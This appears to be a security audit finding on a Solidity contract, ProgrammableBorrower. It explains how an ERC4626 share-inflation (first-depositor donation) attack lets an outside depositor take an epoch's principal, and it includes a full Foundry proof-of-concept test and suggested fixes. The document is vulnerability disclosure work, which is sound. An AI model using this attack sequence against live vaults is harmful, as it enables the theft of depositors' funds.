### Title
Unprotected ERC4626 deposit enables first-depositor theft of epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits the entire idle pool balance into an arbitrary configured ERC4626 vault without requiring a minimum share amount or validating the value of the shares received. If the vault is empty or nearly empty, an unprivileged vault depositor can seed one share, donate enough underlying to make the Credit Vault’s deposit mint zero shares, and redeem the combined balance for a profit approximately equal to the deposited principal. [1](#0-0) 

### Finding Description
During `onStartEpoch`, the adapter snapshots the pool’s pre-deposit balance as epoch principal and deposits the contract’s entire on-hand underlying balance through `_depositToVault`. [2](#0-1) 

`_depositToVault` accepts the ERC4626-reported share count without checking `shares > 0`, comparing it with a caller-supplied minimum, or confirming that `convertToAssets(shares)` is close to the deposited assets. [3](#0-2) 

The configured vault is validated only for a nonzero address and matching asset during initialization, and later replacement only checks the asset, inactive accounting, and a zero existing share balance; neither path rejects an empty, manipulated, or zero-share-minting vault. [4](#0-3) [5](#0-4) 

After the deposit, all later accounting derives the vault position through `vault.balanceOf()` and `vault.convertToAssets()`. [6](#0-5) 

Consequently, a zero-share deposit is recorded internally as a vault loss equal to the epoch baseline, while `totalInterestDueNow()` merely floors the resulting pool-facing interest at zero. [7](#0-6) [8](#0-7) 

The Credit Vault nevertheless keeps the principal represented by its strategy-token balance because `IdleCreditVault.price()` always returns one underlying unit and does not value the borrower-side ERC4626 position. [9](#0-8) 

When withdrawals exist, the CDO asks the adapter to source the pending receipt amount and then pulls funds from the borrower; with no vault shares or cash, that pull cannot be funded and the pool enters default accounting. [10](#0-9) 

### Impact Explanation
For a principal deposit `P`, the attacker spends approximately `P + 1` underlying to create one vault share and inflate its assets, causes `ProgrammableBorrower` to receive zero shares for `P`, and redeems the sole share for approximately `2P + 1`. [2](#0-1) [3](#0-2) 

The attacker’s net profit is approximately `P`, while the Credit Vault’s NAV can continue to display the full tranche principal until withdrawals or settlement reveal the missing borrower-side assets. [9](#0-8) [11](#0-10) 

### Likelihood Explanation
The attacker needs the configured ERC4626 vault to have zero or sufficiently small supply before `onStartEpoch` and to permit a deposit that mints zero shares after donation-based price inflation. [12](#0-11) 

No privileged malicious action is required: an ordinary vault depositor performs the seed deposit and direct transfer, while the honest manager’s ordinary `startEpoch` call triggers the vulnerable deposit. [13](#0-12) 

### Recommendation
Require `vault.deposit()` to return at least a caller-computed minimum share amount and require the post-deposit `convertToAssets(shares)` value to cover the deposited assets within an explicit rounding tolerance. [1](#0-0) 

Also reject ERC4626 vaults with zero supply or require a protected initial liquidity position before enabling them, and consider using `mint()` with an exact expected share amount where supported. [4](#0-3) [5](#0-4) 

### Proof of Concept
This test can be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`; the existing `MockStopEpochLiquidityVault` models a standards-compliant vault whose `deposit()` can return zero shares after a donation. [14](#0-13) [15](#0-14) 

```solidity
function testProgrammableBorrowerERC4626InflationStealsDeposit() external {
    uint256 amount = 10_000 * oneScale;
    address attacker = makeAddr("externalVaultUser");

    // Point the honest strategy borrower at a fresh ERC4626 vault.
    MockStopEpochLiquidityVault inflationVault =
        new MockStopEpochLiquidityVault(USDC);

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    programmableBorrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
        address(implementation),
        makeAddr("inflationBorrowerProxyAdmin"),
        abi.encodeWithSelector(
            ProgrammableBorrower.initialize.selector,
            address(inflationVault),
            address(cdoEpoch),
            address(this),
            manager,
            revolvingBorrower,
            365e18
        )
    )));

    vm.prank(owner);
    strategy.setBorrower(address(programmableBorrower));

    // Attacker seeds one share, then donates `amount` so the pool's
    // `amount` deposit mints floor(amount / (amount + 1)) == 0 shares.
    deal(USDC, attacker, amount + 1);
    vm.startPrank(attacker);
    underlying.approve(address(inflationVault), 1);
    inflationVault.deposit(1, attacker);
    underlying.transfer(address(inflationVault), amount);
    vm.stopPrank();

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // The pool deposited all principal but owns no vault position.
    assertEq(inflationVault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);
    assertEq(cdoEpoch.virtualPrice(address(aaTranche)), oneScale);

    // The attacker's sole share redeems attacker deposit + donation + pool deposit.
    vm.prank(attacker);
    uint256 redeemed = inflationVault.redeem(1, attacker, attacker);

    assertEq(redeemed, 2 * amount + 1);
    assertEq(underlying.balanceOf(attacker), 2 * amount + 1);

    // The stale one-to-one NAV lets a receipt be created, but settlement cannot source it.
    cdoEpoch.requestWithdraw(0, address(aaTranche));
    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.defaulted());
}
```

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
